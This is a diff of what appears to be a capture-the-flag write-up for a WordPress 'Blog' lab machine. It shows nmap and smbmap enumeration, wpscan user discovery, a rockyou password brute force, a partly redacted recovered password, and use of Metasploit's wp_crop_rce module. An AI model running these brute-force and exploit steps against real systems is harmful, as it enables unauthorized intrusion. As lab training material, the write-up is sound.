@@ -12,17 +12,14 @@ comments: false
 <br>
 <br>
 ## Starting with an nmap scan, we see: 
-22/tcp  open  ssh
-80/tcp  open  http
-139/tcp open  netbios-ssn
-445/tcp open  microsoft-ds
+
+******1
+<br>
 
 ## Let's do an SMB scan to check for any shares
 ## smbmap shows:
-        print$                              NO ACCESS       Printer Drivers
-        BillySMB                            READ, WRITE     Billy's local SMB Share
-        IPC$                                NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
-   
+
+******2
 
 <br>
 {% highlight bash %}
@@ -44,41 +41,40 @@ check-this: shows a QR Code that opens a billy joel music vido
 ## lets check it out with a wpscan:
 {% highlight bash %}
 wpscan --update                   - update
-wpscan -H <target_IP>             -basic scan 
-wpscan -H <target_IP> -e vp,vt,u  -full scan 
+wpscan --url <target_IP> -e vp,vt,u  -full scan 
 {% endhighlight bash %}
 
-## Performing a full scan shows usernames 
-bjoel, kwheel
+******3
+<br>
+
+## Performing a full scan shows usernames: bjoel, kwheel
+******4
+<br>
 
 ## We can brute force passwords for these usernames 
 wpscan --url http://<target_IP> --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
-
+******5
 
 ## We get Karen Wheelers username and password
 Username: kwheel
 Password: cutiepie1[redacted]
+******5
+<br>
 
 ## We now need to find the login page
 ## Looking at robots.txt: 
-User-agent: *
 Disallow: /wp-admin/
 Allow: /wp-admin/admin-ajax.php
-
-{% highlight bash %}
-*** /wp-admin/admin-ajax.php is a dead end
-*** /wp-content shows another dead end
-{% endhighlight bash %}
 
 ## We find the login page at: /wp-admin/
 
 <br>
-## This is WordPress 5.0
-## We find out that there is a known vulnerability:
+## This is WordPress version 5.0
+## By googling, we find out that there is a known vulnerability:
 ## "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)",
 
 <br>
-## Searching WordPress 5.0 on Metasploit we can run exploit  #0
+## Searching WordPress 5.0 on Metasploit we can run the 1st option
 > 0   exploit/multi/http/wp_crop_rce   
 >enter: USERNAME PASSWORD RHOST AND LHOST AND LPORT
 
